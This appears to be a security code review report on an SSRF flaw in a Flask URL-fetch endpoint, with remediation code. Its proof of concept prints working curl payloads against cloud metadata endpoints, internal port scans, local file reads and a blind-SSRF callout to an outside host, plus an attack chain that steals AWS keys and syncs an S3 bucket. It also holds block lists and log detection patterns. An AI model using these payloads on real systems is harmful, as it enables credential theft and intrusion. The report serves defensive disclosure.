# Security Code Review Report

## Target Information
- **Domain**: internal.example.com
- **Review Date**: 2024-11-18
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/internal-tools
- **Commit Hash**: c4b7e9a2f5d8c1b6e3a9f2d7c5e8b4a1d6f9c3e7

---

## Executive Summary

This report identifies a critical Server-Side Request Forgery (SSRF) vulnerability in the internal tools application at internal.example.com. The vulnerability allows attackers to make arbitrary HTTP requests from the server, potentially exposing internal services, cloud metadata endpoints, and enabling further attacks on the internal network infrastructure.

---

## Vulnerability Details

### 1. Server-Side Request Forgery (SSRF) in URL Fetcher

**Severity**: CRITICAL
**CWE**: CWE-918 (Server-Side Request Forgery)
**CVSS Score**: 9.1
**File**: `src/utils/urlFetcher.py:28`
**Git Commit**: c4b7e9a2f5d8c1b6e3a9f2d7c5e8b4a1d6f9c3e7

#### Description
The URL fetcher utility accepts user-supplied URLs without proper validation and makes HTTP requests directly from the server. This allows attackers to access internal services, cloud metadata endpoints (AWS, Azure, GCP), and perform port scanning on internal networks.

#### Vulnerable Code
```python
# src/utils/urlFetcher.py

import requests
from flask import request, jsonify

@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    """
    Fetch content from a URL for preview/analysis
    """
    data = request.get_json()
    url = data.get('url')

    if not url:
        return jsonify({'error': 'URL required'}), 400

    try:
        # VULNERABLE: No validation of URL
        # Allows internal network access and metadata endpoints
        response = requests.get(url, timeout=10)

        return jsonify({
            'status': response.status_code,
            'content': response.text,
            'headers': dict(response.headers)
        })

    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500
```

#### Proof of Concept

**1. AWS Metadata Exfiltration (EC2 Instance)**
```bash
# Fetch AWS instance metadata
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Get IAM credentials
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Get specific role credentials
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role"}'

# Response contains:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

**2. Azure Metadata Exfiltration**
```bash
# Azure Instance Metadata Service
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'

# Azure Managed Identity Token
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
```

**3. GCP Metadata Exfiltration**
```bash
# GCP metadata
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/"}'

# GCP service account token
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'
```

**4. Internal Network Scanning**
```bash
# Scan internal network
for ip in 192.168.1.{1..254}; do
  curl -X POST https://internal.example.com/api/fetch-url \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://${ip}:22\"}" \
    2>/dev/null | grep -q "status" && echo "$ip:22 - OPEN"
done

# Scan common service ports
for port in 22 80 443 3306 5432 6379 27017 9200; do
  curl -X POST https://internal.example.com/api/fetch-url \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"http://192.168.1.10:${port}\"}"
done
```

**5. Access Internal Services**
```bash
# Access internal admin panels
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://admin.internal:8080/admin"}'

# Access internal databases (if HTTP interface exists)
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://elasticsearch.internal:9200/_cat/indices"}'

# Access internal Redis
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://redis.internal:6379/"}'

# Access Kubernetes API
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "https://kubernetes.default.svc/api/v1/namespaces"}'
```

**6. File Protocol Exploitation (if supported)**
```bash
# Read local files
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'

curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///var/www/config/database.yml"}'
```

**7. Blind SSRF Detection**
```bash
# Use external DNS logging service
curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://attackerid.burpcollaborator.net"}'

# Check DNS logs to confirm SSRF
```

#### Impact
- **Cloud Credentials Theft**: Access to AWS/Azure/GCP credentials
- **Internal Network Compromise**: Access to internal services
- **Data Exfiltration**: Access to internal databases and APIs
- **Lateral Movement**: Use as pivot point for further attacks
- **Port Scanning**: Map internal network infrastructure
- **Denial of Service**: Overwhelm internal services
- **Authentication Bypass**: Access services behind firewall
- **Container Escape**: Access Kubernetes/Docker APIs

#### Attack Chain Example
```bash
# 1. Steal AWS credentials via SSRF
CREDS=$(curl -X POST https://internal.example.com/api/fetch-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role"}')

# 2. Extract credentials
ACCESS_KEY=$(echo $CREDS | jq -r '.content | fromjson | .AccessKeyId')
SECRET_KEY=$(echo $CREDS | jq -r '.content | fromjson | .SecretAccessKey')
SESSION_TOKEN=$(echo $CREDS | jq -r '.content | fromjson | .Token')

# 3. Use credentials to access AWS resources
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_SESSION_TOKEN=$SESSION_TOKEN

# 4. Exfiltrate data
aws s3 ls
aws s3 sync s3://company-secrets ./stolen-data/

# 5. Escalate privileges
aws iam list-users
aws ec2 describe-instances
```

#### Remediation

**Comprehensive SSRF Protection:**

```python
# src/utils/urlFetcher.py - SECURE VERSION

import requests
import ipaddress
from urllib.parse import urlparse
from flask import request, jsonify
import re

# Allowlist of permitted domains
ALLOWED_DOMAINS = [
    'api.trusted-partner.com',
    'cdn.example.com',
    'external-service.com'
]

# Blocklist of dangerous hosts/IPs
BLOCKED_HOSTS = [
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '169.254.169.254',  # AWS metadata
    'metadata.google.internal',  # GCP metadata
    '::1',  # IPv6 localhost
    'metadata',
    'instance-data'
]

# Blocklist of internal IP ranges
BLOCKED_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]

def is_safe_url(url):
    """
    Validate URL is safe and not targeting internal resources
    """
    try:
        parsed = urlparse(url)

        # 1. Only allow HTTP/HTTPS protocols
        if parsed.scheme not in ['http', 'https']:
            return False, "Only HTTP/HTTPS protocols allowed"

        # 2. URL must have a hostname
        if not parsed.hostname:
            return False, "Invalid URL format"

        # 3. Check against blocked hostnames
        hostname_lower = parsed.hostname.lower()
        if any(blocked in hostname_lower for blocked in BLOCKED_HOSTS):
            return False, "Access to this host is not allowed"

        # 4. Domain must be in allowlist
        if not any(parsed.hostname.endswith(domain) for domain in ALLOWED_DOMAINS):
            return False, "Domain not in allowlist"

        # 5. Resolve hostname and check IP
        try:
            import socket
            ip = socket.gethostbyname(parsed.hostname)
            ip_obj = ipaddress.ip_address(ip)

            # Check if IP is in blocked ranges
            for blocked_range in BLOCKED_IP_RANGES:
                if ip_obj in blocked_range:
                    return False, f"IP address {ip} is in blocked range"

        except socket.gaierror:
            return False, "Unable to resolve hostname"

        # 6. Check port (optional - restrict to 80/443)
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        if port not in [80, 443]:
            return False, "Only ports 80 and 443 are allowed"

        return True, "OK"

    except Exception as e:
        return False, f"URL validation error: {str(e)}"

@app.route('/api/fetch-url', methods=['POST'])
def fetch_url():
    """
    Securely fetch content from validated URLs
    """
    data = request.get_json()
    url = data.get('url')

    if not url:
        return jsonify({'error': 'URL required'}), 400

    # Validate URL
    is_safe, message = is_safe_url(url)
    if not is_safe:
        return jsonify({'error': f'Invalid URL: {message}'}), 403

    try:
        # Make request with additional security measures
        response = requests.get(
            url,
            timeout=5,  # Shorter timeout
            allow_redirects=False,  # Prevent redirect-based bypasses
            headers={'User-Agent': 'InternalTools/1.0'},
            # Disable dangerous protocols
            verify=True  # Verify SSL certificates
        )

        # Don't return full headers (may contain sensitive info)
        safe_headers = {
            'content-type': response.headers.get('content-type'),
            'content-length': response.headers.get('content-length')
        }

        # Limit response size
        max_size = 1024 * 1024  # 1MB
        content = response.text[:max_size]

        return jsonify({
            'status': response.status_code,
            'content': content,
            'headers': safe_headers
        })

    except requests.exceptions.RequestException as e:
        return jsonify({'error': 'Failed to fetch URL'}), 500
```

**Additional Protection Layers:**

```python
# Network-level protection using custom DNS resolver
import dns.resolver

def resolve_with_validation(hostname):
    """
    Resolve hostname and validate it doesn't point to internal IPs
    """
    try:
        answers = dns.resolver.resolve(hostname, 'A')
        for rdata in answers:
            ip = ipaddress.ip_address(rdata.address)
            for blocked_range in BLOCKED_IP_RANGES:
                if ip in blocked_range:
                    raise ValueError(f"Hostname resolves to blocked IP: {rdata.address}")
        return True
    except Exception as e:
        raise ValueError(f"DNS resolution failed: {str(e)}")
```

---

## Additional Findings

### 2. No Rate Limiting on URL Fetch Endpoint

**Severity**: MEDIUM
**File**: `src/utils/urlFetcher.py`

The endpoint lacks rate limiting, enabling rapid port scanning and DoS attacks.

**Remediation**: Implement rate limiting using Flask-Limiter:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10 per minute"]
)

@app.route('/api/fetch-url', methods=['POST'])
@limiter.limit("5 per minute")
def fetch_url():
    # ... implementation
```

### 3. Missing Authentication on Internal Tools

**Severity**: HIGH
**File**: Multiple endpoints

Several internal tool endpoints lack proper authentication.

**Remediation**: Implement authentication middleware for all endpoints.

---

## Recommendations

1. **Immediate Actions** (within 24 hours):
   - Disable /api/fetch-url endpoint immediately
   - Block access to cloud metadata endpoints at network level
   - Review access logs for SSRF exploitation attempts
   - Rotate all cloud credentials as precaution
   - Enable IMDSv2 on AWS (requires token for metadata access)

2. **Short-term Actions** (within 1 week):
   - Implement URL allowlist approach
   - Add IP range validation
   - Implement rate limiting
   - Deploy network segmentation
   - Add WAF rules to detect SSRF patterns

3. **Long-term Improvements**:
   - Use dedicated service accounts with minimal permissions
   - Implement network policies to block metadata endpoints
   - Regular security audits and penetration testing
   - Implement egress filtering
   - Use VPC endpoints for cloud services
   - Deploy intrusion detection system

4. **Cloud-Specific Protections**:

   **AWS:**
   ```bash
   # Require IMDSv2 (token-based metadata access)
   aws ec2 modify-instance-metadata-options \
     --instance-id i-1234567890abcdef0 \
     --http-tokens required \
     --http-put-response-hop-limit 1
   ```

   **Azure:**
   - Disable Azure Instance Metadata Service if not needed
   - Use managed identities with minimal scope

   **GCP:**
   - Enable metadata concealment
   - Use Workload Identity for Kubernetes

---

## Detection Methods

**Monitor for SSRF attempts in logs:**
```bash
# Check for metadata endpoint access
grep "169.254.169.254" /var/log/app/access.log

# Check for internal IP access
grep -E "192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\." /var/log/app/access.log

# Check for suspicious URL patterns
grep -E "(file://|gopher://|dict://)" /var/log/app/access.log
```

**Firewall rules to block metadata access:**
```bash
# Block AWS metadata endpoint
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block GCP metadata
iptables -A OUTPUT -d metadata.google.internal -j DROP
```

---

## Timeline
- **Discovery**: 2024-11-16
- **Verification**: 2024-11-17
- **Report Delivered**: 2024-11-18
- **Expected Fix**: IMMEDIATE (Critical Priority)

---

## References
- OWASP SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
